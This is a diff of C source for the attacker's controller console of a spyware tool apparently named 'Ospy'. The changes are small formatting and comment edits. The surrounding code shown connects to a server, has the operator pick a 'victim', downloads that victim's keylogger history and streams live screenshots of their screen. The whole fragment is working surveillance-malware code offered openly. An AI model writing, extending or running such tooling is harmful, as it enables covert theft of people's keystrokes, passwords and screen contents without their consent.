@@ -24,22 +24,20 @@
 #include <signal.h>
 #include <stdbool.h>
 
-//#define USER_MESSAGE_PROMPT  // u can comment it or uncomment it and all the user-friendly GUI will appear / unappear
-
-static volatile bool keep_getting_keystrokes = true; // SIGINT will change it
-static volatile int keepRunningscreen = 1; // SIGINT will change it
+static volatile bool keep_getting_keystrokes = true; // SIGINT call will change it
+static volatile int keepRunningscreen = 1; 			// SIGINT call will change it
 
 main_data data; // unencrypted main data struct, will be encrypt in the A_2_S_encrypted_message_handler function
 
-void stop_keystrokes_stream_loop ();
+void stop_keystrokes_stream_loop();
 void stop_screen_stream_sig();
 
-int main (){
+int main(){
+	print_rocket_ship_image();
 	while (create_connection() != CONNECTION_SUCCESS){
 		printf("[\033[31;1m-\033[0m] \033[31;1mconnection failed, trying to connect again ...\033[0m\n");
 		sleep(2);
 	}
-	
 	#ifdef USER_MESSAGE_PROMPT
 		connecting_load();
 	#endif
@@ -75,7 +73,7 @@ int main (){
 				sleep(1);
 				break;
 		}
-	} while (!left_welcome_page); // exit from the loop if the user logged in
+	} while (!left_welcome_page); // exit from the loop/welcome page if the user logged in successfully
 
 	choose_victim();
 
@@ -91,7 +89,7 @@ int main (){
 				fflush(stdout);
 				if (recv_file(selected_victim_name, "keylogger", ".txt", "keylogger_history") == FILE_RECEIVED){
 					printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m %s's keylogger history file saved successfully\033[0m\n", selected_victim_name);
-					printf("\r[»] Ospy folder path : %s/Ospy", pwd);
+					printf("[»] Ospy folder path : %s/Ospy\n", pwd);
 					press_enter_to_continue();
 				}
 				else {	
@@ -117,7 +115,8 @@ int main (){
 				signal(SIGINT, stop_screen_stream_sig);
 				A_2_S_encrypted_message_handler(data, GET_SCREEN_STREAM);
 				printf("\r[\033[32;1m+\033[0m] \033[1m\033[32m%s's live screen stream started successfully\033[0m\n", selected_victim_name);
-				printf("\r[»] Ospy folder path : %s/Ospy", pwd);
+				printf("[»] Ospy folder path : %s/Ospy", pwd);
+				fflush(stdout);
 				while (keepRunningscreen){ // it the attacker will press ^C, SIGINT signal will sand to 'stop_screen_stream_sig'
 					recv_file(selected_victim_name, "screenshot", ".jpg", "screenshots");
 				}	
